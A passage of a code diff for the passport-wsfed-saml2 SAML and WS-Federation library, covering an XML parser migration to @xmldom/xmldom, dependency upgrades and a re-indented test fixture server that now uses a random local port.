exports.parseXmlString(xml, parser);\n+    } catch (e) {\n+      throw new SamlRequestParserError('SAMLRequest should be a valid xml', e);\n+    }\n+  }\n+\n+  return xml;\n+};\n+\n+exports.parseWsFedResponse = function(xml, parser) {\n+  if (typeof xml === 'string') {\n+    try {\n+      return exports.parseXmlString(xml, parser);\n     } catch (e) {\n       throw new WSFederationResultParserError('wresult should be a valid xml', e);\n     }\n\n@@ -68,15 +90,15 @@\nexports.getReqUrl = function(req){\n };\n \n exports.generateUniqueID = function() {\n-  var uniqueID = crypto.randomBytes(16);\n+  const uniqueID = crypto.randomBytes(16);\n   return uniqueID.toString('hex');\n };\n \n exports.getEncoding = function(xml){\n-  try{\n-    const response = new xmldom.DOMParser().parseFromString(crlf2lf(xml));\n+  try {\n+    const response = exports.parseXmlString(xml);\n     // <?xml version=\"1.0\" encoding=\"XXXX\"?> -> read encoding\n-    if (response.firstChild && response.firstChild.tagName == 'xml'){\n+    if (response.firstChild && response.firstChild.nodeName === 'xml'){\n       const regex = /(?:encoding=\\\")([^\\\"]*)(?:\\\")/g;\n       const match = regex.exec(response.firstChild.nodeValue);\n       // [0] the complete match\n\n@@ -110,4 +132,4 @@\nexports.stringCompare = function(a,b) {\n   }\n \n   return a === b;\n-};\n+};\n\\ No newline at end of file\n```\n\nFilename: lib/passport-wsfed-saml2/wsfederation.js:\n```\n@@ -1,20 +1,25 @@\n-var xtend = require('xtend');\n-var qs = require('querystring');\n-var xpath = require('xpath');\n+const xtend = require('xtend');\n+const qs = require('querystring');\n+const xpath = require('xpath');\n+const xmldom = require('@xmldom/xmldom');\n \n-var utils = require('./utils');\n-var AuthenticationFailedError = require('./errors/AuthenticationFailedError');\n+const domParser = new xmldom.DOMParser();\n \n-var WsFederation = module.exports = function WsFederation (realm, homerealm, identityProviderUrl, wreply) {\n+const utils = require('./utils');\n+const AuthenticationFailedError = require('./errors/AuthenticationFailedError');\n+\n+\n+const WsFederation = module.exports = function WsFederation (realm, homerealm, identityProviderUrl, wreply) {\n   this.realm = realm;\n   this.homerealm = homerealm;\n   this.identityProviderUrl = identityProviderUrl;\n   this.wreply = wreply;\n+  this.parser = domParser;\n };\n \n WsFederation.prototype = {\n   getRequestSecurityTokenUrl: function (options) {\n-    var query = xtend(options || {}, {\n+    const query = xtend(options || {}, {\n       wtrealm: this.realm,\n       wa:      'wsignin1.0'\n     });\n\n@@ -31,13 +36,13 @@\nWsFederation.prototype = {\n   },\n \n   extractToken: function(req) {\n-    var doc = utils.parseWsFedResponse(req.body['wresult']);\n+    const doc = utils.parseWsFedResponse(req.body['wresult'], this.parser);\n \n     // //Probe WS-Trust 1.2 namespace (http://schemas.xmlsoap.org/ws/2005/02/trust)\n-    var token = doc.getElementsByTagNameNS('http://schemas.xmlsoap.org/ws/2005/02/trust', 'RequestedSecurityToken')[0];\n+    let token = doc.getElementsByTagNameNS('http://schemas.xmlsoap.org/ws/2005/02/trust', 'RequestedSecurityToken')[0];\n \n     // //Probe WS-Trust 1.3 namespace (http://docs.oasis-open.org/ws-sx/ws-trust/200512)\n-    if(!token){\n+    if (!token) {\n       token = doc.getElementsByTagNameNS('http://docs.oasis-open.org/ws-sx/ws-trust/200512', 'RequestedSecurityToken')[0];\n     }\n\n@@ -48,51 +53,55 @@\nWsFederation.prototype = {\n     if (req.body.wresult.indexOf('<') === -1) {\n       return callback(new Error('wresult should be a valid xml'));\n     }\n-\n-    var fault = this.extractFault(req);\n+    const fault = this.extractFault(req);\n     if (fault) {\n       return callback(new AuthenticationFailedError(fault.message, fault.detail));\n     }\n \n-    var token = this.extractToken(req);\n+    const token = this.extractToken(req);\n     if (!token) {\n       return callback(new Error('missing RequestedSecurityToken element'));\n     }\n \n     // Check for more than one Assertions to conform with spec\n-    var foundAssertions = xpath.select(\"//*[local-name(.)='Assertion']\", token);\n+    const foundAssertions = xpath.select(\"//*[local-name(.)='Assertion']\", token);\n     if (foundAssertions.length > 1) {\n       return callback(new Error('A RequestedSecurityToken can contain only one Assertion element.'));\n     }\n \n-    callback(null, token);\n+    callback(null, req.body.wresult);\n   },\n \n   extractFault: function(req) {\n-    var fault = {};\n-    var doc = utils.parseWsFedResponse(req.body['wresult']);\n+    const fault = {};\n+    let doc;\n+    try {\n+       doc = utils.parseWsFedResponse(req.body['wresult'], this.parser);\n+    } catch (err) {\n+      return err;\n+    }\n \n-    var isFault = xpath.select(\"//*[local-name(.)='Fault']\", doc)[0];\n+    const isFault = xpath.select(\"//*[local-name(.)='Fault']\", doc)[0];\n     if (!isFault) {\n       return null;\n     }\n \n-    var codeXml = xpath.select(\"//*[local-name(.)='Fault']/*[local-name(.)='Code']/*[local-name(.)='Value']\", doc)[0];\n+    const codeXml = xpath.select(\"//*[local-name(.)='Fault']/*[local-name(.)='Code']/*[local-name(.)='Value']\", doc)[0];\n     if (codeXml) {\n       fault.code = codeXml.textContent;\n     }\n \n-    var subCodeXml = xpath.select(\"//*[local-name(.)='Fault']/*[local-name(.)='Code']/*[local-name(.)='Subcode']/*[local-name(.)='Value']\", doc)[0];\n+    const subCodeXml = xpath.select(\"//*[local-name(.)='Fault']/*[local-name(.)='Code']/*[local-name(.)='Subcode']/*[local-name(.)='Value']\", doc)[0];\n     if (subCodeXml) {\n       fault.subCode = subCodeXml.textContent;\n     }\n \n-    var messageXml = xpath.select(\"//*[local-name(.)='Fault']/*[local-name(.)='Reason']/*[local-name(.)='Text']\", doc)[0];\n+    const messageXml = xpath.select(\"//*[local-name(.)='Fault']/*[local-name(.)='Reason']/*[local-name(.)='Text']\", doc)[0];\n     if (messageXml) {\n       fault.message = messageXml.textContent;\n     }\n \n-    var detailXml = xpath.select(\"//*[local-name(.)='Fault']/*[local-name(.)='Detail']\", doc)[0];\n+    const detailXml = xpath.select(\"//*[local-name(.)='Fault']/*[local-name(.)='Detail']\", doc)[0];\n     if (detailXml) {\n       fault.detail = detailXml.textContent;\n     }\n\n@@ -117,4 +126,4 @@\nObject.defineProperty(WsFederation, 'identityProviderUrl', {\n   get: function () {\n     return this.identityProviderUrl;\n   }\n-});\n+});\n\\ No newline at end of file\n```\n\nFilename: package.json:\n```\n@@ -1,6 +1,6 @@\n{\n   \"name\": \"passport-wsfed-saml2\",\n-  \"version\": \"4.6.3\",\n+  \"version\": \"4.6.4\",\n   \"description\": \"SAML2 Protocol and WS-Fed library\",\n   \"scripts\": {\n     \"test\": \"./node_modules/.bin/mocha --recursive\",\n\n@@ -21,16 +21,16 @@\n},\n   \"main\": \"./lib/passport-wsfed-saml2\",\n   \"dependencies\": {\n-    \"@auth0/xmldom\": \"0.1.22\",\n-    \"ejs\": \"2.5.5\",\n+    \"@xmldom/xmldom\": \"^0.9.8\",\n+    \"ejs\": \"^3.1.10\",\n     \"jsonwebtoken\": \"~9.0.0\",\n-    \"node-forge\": \"^0.10.0\",\n+    \"node-forge\": \"^1.3.1\",\n     \"passport-strategy\": \"^1.0.0\",\n-    \"uid2\": \"0.0.x\",\n+    \"uid2\": \"^1.0.0\",\n     \"valid-url\": \"^1.0.9\",\n-    \"xml-crypto\": \"auth0/xml-crypto#v1.4.1-auth0.2\",\n+    \"xml-crypto\": \"^6.1.0\",\n     \"xml-encryption\": \"^2.0.0\",\n-    \"xpath\": \"0.0.5\",\n+    \"xpath\": \"^0.0.33\",\n     \"xtend\": \"~2.0.3\"\n   },\n   \"devDependencies\": {\n\n@@ -47,7 +47,7 @@\n\"wsfed\": \"~0.3.5\"\n   },\n   \"engines\": {\n-    \"node\": \">= 12\"\n+    \"node\": \">= 18\"\n   },\n   \"licenses\": [\n     {\n```\n\nFilename: test/fixture/samlp-server.js:\n```\n@@ -8,425 +8,437 @@\nvar path = require('path');\n var passport = require('passport');\n var Strategy = require('../../lib/passport-wsfed-saml2').Strategy;\n \n-var identityProviderUrl = 'http://localhost:5051/samlp';\n+const PORT = 3000 + Math.floor(Math.random() * 7000);\n+const BASE_URL = `http://localhost:${PORT}`;\n+var identityProviderUrl = `${BASE_URL}/samlp`;\n var relayState = 'somestate';\n \n+passport.serializeUser(function(user, done) {\n+    done(null, user);\n+});\n+\n+passport.deserializeUser(function(user, done) {\n+    done(null, user);\n+});\n+\n passport.use('samlp', new Strategy({\n-    path: '/callback',\n-    realm: 'https://auth0-dev-ed.my.salesforce.com',\n-    identityProviderUrl: identityProviderUrl,\n-    thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n-    recipientUrl: 'https://auth0-dev-ed.my.salesforce.com',\n-    destinationUrl: 'https://auth0-dev-ed.my.salesforce.com'\n-  }, function(profile, done) {\n-    return done(null, profile);\n-  })\n+        path: '/callback',\n+        realm: 'https://auth0-dev-ed.my.salesforce.com',\n+        identityProviderUrl: identityProviderUrl,\n+        thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n+        recipientUrl: 'https://auth0-dev-ed.my.salesforce.com',\n+        destinationUrl: 'https://auth0-dev-ed.my.salesforce.com'\n+    }, function(profile, done) {\n+        return done(null, profile);\n+    })\n );\n \n passport.use('samlp-http-post', new Strategy({\n-    protocolBinding: 'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST',\n-    path: '/callback',\n-    realm: 'https://auth0-dev-ed.my.salesforce.com',\n-    identityProviderUrl: identityProviderUrl,\n-    thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309']\n-  }, function(profile, done) {\n-    return done(null, profile);\n-  })\n+        protocolBinding: 'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST',\n+        path: '/callback',\n+        realm: 'https://auth0-dev-ed.my.salesforce.com',\n+        identityProviderUrl: identityProviderUrl,\n+        thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309']\n+    }, function(profile, done) {\n+        return done(null, profile);\n+    })\n );\n \n passport.use('samlp-custom-request-template', new Strategy({\n-    path: '/callback',\n-    realm: 'https://auth0-dev-ed.my.salesforce.com',\n-    identityProviderUrl: identityProviderUrl,\n-    thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n-    requestTemplate: '<AuthnRequest Issuertico=\"\n\n@@Issuer@@\n\" Version=\"3.0\" Protocol=\"\n\n@@ProtocolBinding@@\n\" Foo=\"\n\n@@Foo.Test@@\n\"></AuthnRequest>',\n-    requestContext: {\n-      Foo: {\n-        Test: 123\n-      }\n-    }\n-  }, function(profile, done) {\n-    return done(null, profile);\n-  })\n+        path: '/callback',\n+        realm: 'https://auth0-dev-ed.my.salesforce.com',\n+        identityProviderUrl: identityProviderUrl,\n+        thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n+        requestTemplate: '<AuthnRequest Issuertico=\"\n\n@@Issuer@@\n\" Version=\"3.0\" Protocol=\"\n\n@@ProtocolBinding@@\n\" Foo=\"\n\n@@Foo.Test@@\n\"></AuthnRequest>',\n+        requestContext: {\n+            Foo: {\n+                Test: 123\n+            }\n+        }\n+    }, function(profile, done) {\n+        return done(null, profile);\n+    })\n );\n \n passport.use('samlp-idpurl-with-querystring', new Strategy(\n-  {\n-    path: '/callback',\n-    realm: 'https://auth0-dev-ed.my.salesforce.com',\n-    identityProviderUrl: identityProviderUrl + '?foo=bar',\n-    thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309']\n-  },\n-  function(profile, done) {\n-    return done(null, profile);\n-  })\n+    {\n+        path: '/callback',\n+        realm: 'https://auth0-dev-ed.my.salesforce.com',\n+        identityProviderUrl: identityProviderUrl + '?foo=bar',\n+        thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309']\n+    },\n+    function(profile, done) {\n+        return done(null, profile);\n+    })\n );\n \n passport.use('samlp-signedrequest-without-deflate', new Strategy({\n-    path: '/callback',\n-    realm: 'https://auth0-dev-ed.my.salesforce.com',\n-    identityProviderUrl: identityProviderUrl,\n-    thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n-    signingKey: {\n-      key: fs.readFileSync(path.join(__dirname, '../test-auth0.key')),\n-      cert: fs.readFileSync(path.join(__dirname, '../test-auth0.pem')),\n-    },\n-    deflate: false\n-  }, function(profile, done) {\n-    return done(null, profile);\n-  })\n+        path: '/callback',\n+        realm: 'https://auth0-dev-ed.my.salesforce.com',\n+        identityProviderUrl: identityProviderUrl,\n+        thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n+        signingKey: {\n+            key: fs.readFileSync(path.join(__dirname, '../test-auth0.key')),\n+            cert: fs.readFileSync(path.join(__dirname, '../test-auth0.pem')),\n+        },\n+        deflate: false\n+    }, function(profile, done) {\n+        return done(null, profile);\n+    })\n );\n \n passport.use('samlp-signedrequest-with-deflate', new Strategy({\n-    path: '/callback',\n-    realm: 'https://auth0-dev-ed.my.salesforce.com',\n-    identityProviderUrl: identityProviderUrl,\n-    thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n-    signingKey: {\n-      key: fs.readFileSync(path.join(__dirname, '../test-auth0.key')),\n-      cert: fs.readFileSync(path.join(__dirname, '../test-auth0.pem')),\n-    },\n-    deflate: true\n-  }, function(profile, done) {\n-    return done(null, profile);\n-  })\n+        path: '/callback',\n+        realm: 'https://auth0-dev-ed.my.salesforce.com',\n+        identityProviderUrl: identityProviderUrl,\n+        thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n+        signingKey: {\n+            key: fs.readFileSync(path.join(__dirname, '../test-auth0.key')),\n+            cert: fs.readFileSync(path.join(__dirname, '../test-auth0.pem')),\n+        },\n+        deflate: true\n+    }, function(profile, done) {\n+        return done(null, profile);\n+    })\n );\n \n passport.use('samlp-signedrequest-post', new Strategy({\n-    protocolBinding: 'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST',\n-    path: '/callback',\n-    realm: 'https://auth0-dev-ed.my.salesforce.com',\n-    identityProviderUrl: identityProviderUrl,\n-    thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n-    signingKey: {\n-      key: fs.readFileSync(path.join(__dirname, '../test-auth0.key')),\n-      cert: fs.readFileSync(path.join(__dirname, '../test-auth0.pem')),\n-    },\n-    deflate: false\n-  }, function(profile, done) {\n-    return done(null, profile);\n-  })\n+        protocolBinding: 'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST',\n+        path: '/callback',\n+        realm: 'https://auth0-dev-ed.my.salesforce.com',\n+        identityProviderUrl: identityProviderUrl,\n+        thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n+        signingKey: {\n+            key: fs.readFileSync(path.join(__dirname, '../test-auth0.key')),\n+            cert: fs.readFileSync(path.join(__dirname, '../test-auth0.pem')),\n+        },\n+        deflate: false\n+    }, function(profile, done) {\n+        return done(null, profile);\n+    })\n );\n \n \n passport.use('samlp-signedresponse', new Strategy(\n-  {\n-    path: '/callback',\n-    realm: 'https://auth0-dev-ed.my.salesforce.com',\n-    identityProviderUrl: identityProviderUrl,\n-    thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n-    recipientUrl: 'https://auth0-dev-ed.my.salesforce.com',\n-    destinationUrl: 'https://auth0-dev-ed.my.salesforce.com'\n-  },\n-  function(profile, done) {\n-    return done(null, profile);\n-  })\n+    {\n+        path: '/callback',\n+        realm: 'https://auth0-dev-ed.my.salesforce.com',\n+        identityProviderUrl: identityProviderUrl,\n+        thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n+        recipientUrl: 'https://auth0-dev-ed.my.salesforce.com',\n+        destinationUrl: 'https://auth0-dev-ed.my.salesforce.com'\n+    },\n+    function(profile, done) {\n+        return done(null, profile);\n+    })\n );\n \n passport.use('samlp-signedresponse-invalidcert', new Strategy(\n-  {\n-    path: '/callback',\n-    realm: 'urn:fixture-test',\n-    identityProviderUrl: identityProviderUrl,\n-    thumbprints: ['11111111111111111a5b93a43572eb2376fed309'],\n-    recipientUrl: 'https://auth0-dev-ed.my.salesforce.com',\n-    destinationUrl: 'https://auth0-dev-ed.my.salesforce.com'\n-  },\n-  function(profile, done) {\n-    return done(null, profile);\n-  })\n+    {\n+        path: '/callback',\n+        realm: 'urn:fixture-test',\n+        identityProviderUrl: identityProviderUrl,\n+        thumbprints: ['11111111111111111a5b93a43572eb2376fed309'],\n+        recipientUrl: 'https://auth0-dev-ed.my.salesforce.com',\n+        destinationUrl: 'https://auth0-dev-ed.my.salesforce.com'\n+    },\n+    function(profile, done) {\n+        return done(null, profile);\n+    })\n );\n \n passport.use('samlp-invalidcert', new Strategy(\n-  {\n-    path: '/callback',\n-    realm: 'urn:fixture-test',\n-    identityProviderUrl: identityProviderUrl,\n-    thumbprints: ['11111111111111111a5b93a43572eb2376fed309']\n-  },\n-  function(profile, done) {\n-    return done(null, profile);\n-  })\n+    {\n+        path: '/callback',\n+        realm: 'urn:fixture-test',\n+        identityProviderUrl: identityProviderUrl,\n+        thumbprints: ['11111111111111111a5b93a43572eb2376fed309']\n+    },\n+    function(profile, done) {\n+        return done(null, profile);\n+    })\n );\n \n passport.use('samlp-signedresponse-signedassertion', new Strategy(\n-  {\n-    path: '/callback',\n-    realm: 'urn:auth0:login-dev3',\n-    thumbprints: ['C9ED4DFB07CAF13FC21E0FEC1572047EB8A7A4CB'],\n-    destinationUrl: 'https://login-dev3.auth0.com:3000/login/callback',\n-    recipientUrl: 'https://login-dev3.auth0.com:3000/login/callback',\n-    checkExpiration: false // we are using a precomputed assertion generated from a sample idp feide\n-  },\n-  function(profile, done) {\n-    return done(null, profile);\n-  })\n+    {\n+        path: '/callback',\n+        realm: 'urn:auth0:login-dev3',\n+        thumbprints: ['C9ED4DFB07CAF13FC21E0FEC1572047EB8A7A4CB'],\n+        destinationUrl: 'https://login-dev3.auth0.com:3000/login/callback',\n+        recipientUrl: 'https://login-dev3.auth0.com:3000/login/callback',\n+        checkExpiration: false // we are using a precomputed assertion generated from a sample idp feide\n+    },\n+    function(profile, done) {\n+        return done(null, profile);\n+    })\n );\n \n passport.use('samlp-ping', new Strategy(\n-  {\n-    path: '/callback',\n-    realm: 'urn:auth0:login-dev3',\n-    thumbprints: ['44340220770a348444be34970939cff8a2d74f08'],\n-    destinationUrl: 'https://login-dev3.auth0.com:3000/login/callback',\n-    recipientUrl: 'https://login-dev3.auth0.com:3000/login/callback',\n-    checkExpiration: false // we are using a precomputed assertion generated from a sample idp feide\n-  },\n-  function(profile, done) {\n-    return done(null, profile);\n-  })\n+    {\n+        path: '/callback',\n+        realm: 'urn:auth0:login-dev3',\n+        thumbprints: ['44340220770a348444be34970939cff8a2d74f08'],\n+        destinationUrl: 'https://login-dev3.auth0.com:3000/login/callback',\n+        recipientUrl: 'https://login-dev3.auth0.com:3000/login/callback',\n+        checkExpiration: false // we are using a precomputed assertion generated from a sample idp feide\n+    },\n+    function(profile, done) {\n+        return done(null, profile);\n+    })\n );\n \n passport.use('samlp-okta', new Strategy(\n-  {\n-    path: '/callback',\n-    realm: 'https://auth0145.auth0.com',\n-    thumbprints: ['a0c7dbb790e3476d3c5dd236f9f2060b1fd6e253'],\n-    destinationUrl: 'https://auth0145.auth0.com',\n-    recipientUrl: 'https://auth0145.auth0.com',\n-    checkExpiration: false // we are using a precomputed assertion generated from a sample idp feide\n-  },\n-  function(profile, done) {\n-    return done(null, profile);\n-  })\n+    {\n+        path: '/callback',\n+        realm: 'https://auth0145.auth0.com',\n+        thumbprints: ['a0c7dbb790e3476d3c5dd236f9f2060b1fd6e253'],\n+        destinationUrl: 'https://auth0145.auth0.com',\n+        recipientUrl: 'https://auth0145.auth0.com',\n+        checkExpiration: false // we are using a precomputed assertion generated from a sample idp feide\n+    },\n+    function(profile, done) {\n+        return done(null, profile);\n+    })\n );\n \n function pemToCert(pem) {\n-  // if certificate doesn't have ---- begin cert --- just return the pem\n-  if (!/-----BEGIN CERTIFICATE-----/.test(pem.toString())) {\n-    return pem.toString();\n-  }\n+    // if certificate doesn't have ---- begin cert --- just return the pem\n+    if (!/-----BEGIN CERTIFICATE-----/.test(pem.toString())) {\n+        return pem.toString();\n+    }\n \n-  var cert = /-----BEGIN CERTIFICATE-----([^-]*)-----END CERTIFICATE-----/g.exec(pem.toString());\n-  if (cert.length > 0) {\n-    return cert[1].replace(/[\\n|\\r\\n]/g, '');\n-  }\n+    var cert = /-----BEGIN CERTIFICATE-----([^-]*)-----END CERTIFICATE-----/g.exec(pem.toString());\n+    if (cert.length > 0) {\n+        return cert[1].replace(/[\\n|\\r\\n]/g, '');\n+    }\n \n-  return null;\n+    return null;\n }\n \n passport.use('samlp-with-utf8', new Strategy(\n-  {\n-    path: '/callback',\n-    thumbprints: ['119B9E027959CDB7C662CFD075D9E2EF384E445F'],\n-    decryptionKey: fs.readFileSync(path.join(__dirname, '../test-auth0.key')),\n-    recipientUrl: 'https://login0.myauth0.com/login/callback',\n-    destinationUrl: 'https://login0.myauth0.com/login/callback',\n-    checkExpiration: false, // we are using a precomputed assertion generated from a sample idp feide\n-    checkSPNameQualifier: false,\n-    checkAudience: false\n-  },\n-  function(profile, done) {\n-    return done(null, profile);\n-  })\n+    {\n+        path: '/callback',\n+        thumbprints: ['119B9E027959CDB7C662CFD075D9E2EF384E445F'],\n+        decryptionKey: fs.readFileSync(path.join(__dirname, '../test-auth0.key')),\n+        recipientUrl: 'https://login0.myauth0.com/login/callback',\n+        destinationUrl: 'https://login0.myauth0.com/login/callback',\n+        checkExpiration: false, // we are using a precomputed assertion generated from a sample idp feide\n+        checkSPNameQualifier: false,\n+        checkAudience: false\n+    },\n+    function(profile, done) {\n+        return done(null, profile);\n+    })\n );\n \n passport.use('samlp-with-ISO', new Strategy(\n-  {\n-    path: '/callback',\n-    cert: pemToCert(fs.readFileSync(path.join(__dirname, '../test-auth0.pem'))),\n-    checkExpiration: false, // we are using a precomputed assertion generated from a sample idp feide\n-    checkAudience: false,\n-    checkDestination: false,\n-    checkRecipient: false\n-  },\n-  function(profile, done) {\n-    return done(null, profile);\n-  })\n+    {\n+        path: '/callback',\n+        cert: pemToCert(fs.readFileSync(path.join(__dirname, '../test-auth0.pem'))),\n+        checkExpiration: false, // we are using a precomputed assertion generated from a sample idp feide\n+        checkAudience: false,\n+        checkDestination: false,\n+        checkRecipient: false\n+    },\n+    function(profile, done) {\n+        return done(null, profile);\n+    })\n );\n \n passport.use('samlp-with-ISO-explicit', new Strategy(\n-  {\n-    path: '/callback',\n-    cert: pemToCert(fs.readFileSync(path.join(__dirname, '../test-auth0.pem'))),\n-    checkExpiration: false, // we are using a precomputed assertion generated from a sample idp feide\n-    checkAudience: false,\n-    default_encoding: 'ISO-8859-1',\n-    checkDestination: false,\n-    checkRecipient: false\n-  },\n-  function(profile, done) {\n-    return done(null, profile);\n-  })\n+    {\n+        path: '/callback',\n+        cert: pemToCert(fs.readFileSync(path.join(__dirname, '../test-auth0.pem'))),\n+        checkExpiration: false, // we are using a precomputed assertion generated from a sample idp feide\n+        checkAudience: false,\n+        default_encoding: 'ISO-8859-1',\n+        checkDestination: false,\n+        checkRecipient: false\n+    },\n+    function(profile, done) {\n+        return done(null, profile);\n+    })\n );\n \n passport.use('samlp-with-dsig-at-root', new Strategy(\n-  {\n-    path: '/callback',\n-    checkExpiration: false, // we are using a precomputed assertion generated from a sample idp\n-    checkAudience: false,\n-    checkDestination: false,\n-    cert: pemToCert(fs.readFileSync(path.join(__dirname, '../test-auth0.pem')))\n-  },\n-  function(profile, done) {\n-    return done(null, profile);\n-  })\n+    {\n+        path: '/callback',\n+        checkExpiration: false, // we are using a precomputed assertion generated from a sample idp\n+        checkAudience: false,\n+        checkDestination: false,\n+        cert: pemToCert(fs.readFileSync(path.join(__dirname, '../test-auth0.pem')))\n+    },\n+    function(profile, done) {\n+        return done(null, profile);\n+    })\n );\n \n \n var fakeUser = {\n-  id: '12345678',\n-  displayName: 'John Foo',\n-  name: {\n-    familyName: 'Foo',\n-    givenName: 'John'\n-  },\n-  emails: [\n-    {\n-      type: 'work',\n-      value: 'jfoo@gmail.com'\n-    }\n-  ]\n+    id: '12345678',\n+    displayName: 'John Foo',\n+    name: {\n+        familyName: 'Foo',\n+        givenName: 'John'\n+    },\n+    emails: [\n+        {\n+            type: 'work',\n+            value: 'jfoo@gmail.com'\n+        }\n+    ]\n };\n \n var credentials = {\n-  cert:     fs.readFileSync(path.join(__dirname, '../test-auth0.pem')),\n-  key:      fs.readFileSync(path.join(__dirname, '../test-auth0.key'))\n+    cert:     fs.readFileSync(path.join(__dirname, '../test-auth0.pem')),\n+    key:      fs.readFileSync(path.join(__dirname, '../test-auth0.key'))\n };\n \n module.exports.options = {};\n \n module.exports.start = function(options, callback){\n-  module.exports.options = options;\n-  if (typeof options === 'function') {\n-    callback = options;\n-    module.exports.options = {};\n-  }\n-\n-  var app = express();\n-\n-  app.configure(function(){\n-    this.use(express.bodyParser());\n-    this.use(passport.initialize());\n-    this.use(passport.session());\n-    this.use(function(req,res,next){\n-      req.user = fakeUser;\n-      next();\n-    });\n-  });\n-\n-  function getPostURL (audience, samlRequestDom, req, callback) {\n-    callback(null, 'http://localhost:5051/callback');\n-  }\n-\n-  //configure samlp middleware\n-  app.get('/samlp', function(req, res, next) {\n-    samlp.auth(xtend({}, {\n-        issuer:             'urn:fixture-test',\n-        getPostURL:         getPostURL,\n-        cert:               credentials.cert,\n-        key:                credentials.key,\n-        recipient:          'https://auth0-dev-ed.my.salesforce.com'\n-      }, module.exports.options))(req, res);\n-  });\n-\n-  app.get('/login', passport.authenticate('samlp', { protocol: 'samlp', RelayState: relayState }));\n-  app.get('/login-http-post', passport.authenticate('samlp-http-post', { protocol: 'samlp', RelayState: relayState }));\n-  app.get('/login-idp-with-querystring', passport.authenticate('samlp-idpurl-with-querystring', { protocol: 'samlp', RelayState: relayState }));\n-\n-  app.get('/login-signed-request-without-deflate', passport.authenticate('samlp-signedrequest-without-deflate', { protocol: 'samlp', RelayState: relayState }));\n-  app.get('/login-signed-request-post', passport.authenticate('samlp-signedrequest-post', { protocol: 'samlp', RelayState: relayState }));\n-  app.get('/login-signed-request-with-deflate', passport.authenticate('samlp-signedrequest-with-deflate', { protocol: 'samlp', RelayState: relayState }));\n-\n-  app.get('/login-custom-request-template',\n-      passport.authenticate('samlp-custom-request-template', { protocol: 'samlp', RelayState: relayState }));\n-\n-  app.post('/callback',\n-    function(req, res, next) {\n-      next();\n-    },\n-    passport.authenticate('samlp', { protocol: 'samlp' }),\n-    function(req, res) {\n-      res.json(req.user);\n+    module.exports.options = options;\n+    if (typeof options === 'function') {\n+        callback = options;\n+        module.exports.options = {};\n     }\n-  );\n \n-  app.post('/callback/samlp-signedresponse',\n-    passport.authenticate('samlp-signedresponse', { protocol: 'samlp' }),\n-    function(req, res) {\n-      res.json(req.user);\n-    }\n-  );\n-\n-  app.post('/callback/samlp-signedresponse-invalidcert',\n-    passport.authenticate('samlp-signedresponse-invalidcert', { protocol: 'samlp' }),\n-    function(req, res) {\n-      res.json(req.user);\n-    }\n-  );\n-\n-  app.post('/callback/samlp-invalidcert',\n-    passport.authenticate('samlp-invalidcert', { protocol: 'samlp' }),\n-    function(req, res) {\n-      res.json(req.user);\n-    }\n-  );\n-\n-  app.post('/callback/samlp-signedresponse-signedassertion',\n-    passport.authenticate('samlp-signedresponse-signedassertion', { protocol: 'samlp' }),\n-    function(req, res) {\n-      res.json(req.user);\n-    }\n-  );\n+    var app = express();\n \n-  app.post('/callback/samlp-ping',\n-    passport.authenticate('samlp-ping', { protocol: 'samlp' }),\n-    function(req, res) {\n-      res.json(req.user);\n-    }\n-  );\n-\n-  app.post('/callback/samlp-okta',\n-    passport.authenticate('samlp-okta', { protocol: 'samlp' }),\n-    function(req, res) {\n-      res.json(req.user);\n-    }\n-  );\n-\n-  app.post('/callback/samlp-with-utf8',\n-    passport.authenticate('samlp-with-utf8', { protocol: 'samlp' }),\n-    function(req, res) {\n-      res.json(req.user);\n-    }\n-  );\n-\n-  app.post('/callback/samlp-with-ISO',\n-    passport.authenticate('samlp-with-ISO', { protocol: 'samlp' }),\n-    function(req, res) {\n-      res.json(req.user);\n-    }\n-  );\n-\n-  app.post('/callback/samlp-with-ISO-explicit',\n-  passport.authenticate('samlp-with-ISO-explicit', { protocol: 'samlp' }),\n-  function(req, res) {\n-    res.json(req.user);\n-  }\n-);\n+    app.configure(function(){\n+        this.use(express.bodyParser());\n+        this.use(passport.initialize());\n+        this.use(passport.session());\n+        this.use(function(req,res,next){\n+            req.user = fakeUser;\n+            next();\n+        });\n+    });\n \n-  app.post('/callback/samlp-with-invalid-xml',\n-    function (req, res, next) {\n-      passport.authenticate('samlp-with-utf8', { protocol: 'samlp' }, function(err, user, info) {\n-        res.send(400, { message: err.message });\n-      })(req, res, next);\n-    },\n-    function(req, res) {\n-      res.json(req.user);\n+    function getPostURL (audience, samlRequestDom, req, callback) {\n+        callback(null, `${BASE_URL}/callback`);\n     }\n-  );\n \n-  app.post('/callback/samlp-with-dsig-at-root',\n-    passport.authenticate('samlp-with-dsig-at-root', { protocol: 'samlp' }),\n-    function(req, res) {\n-      res.json(req.user);\n-    }\n-  );\n+    //configure samlp middleware\n+    app.get('/samlp', function(req, res, next) {\n+        samlp.auth(xtend({}, {\n+            issuer:             'urn:fixture-test',\n+            getPostURL:         getPostURL,\n+            cert:               credentials.cert,\n+            key:                credentials.key,\n+            recipient:          'https://auth0-dev-ed.my.salesforce.com'\n+        }, module.exports.options))(req, res);\n+    });\n \n-  var server = http.createServer(app).listen(5051, callback);\n-  module.exports.close = server.close.bind(server);\n+    app.get('/login', passport.authenticate('samlp', { protocol: 'samlp', RelayState: relayState }));\n+    app.get('/login-http-post', passport.authenticate('samlp-http-post', { protocol: 'samlp', RelayState: relayState }));\n+    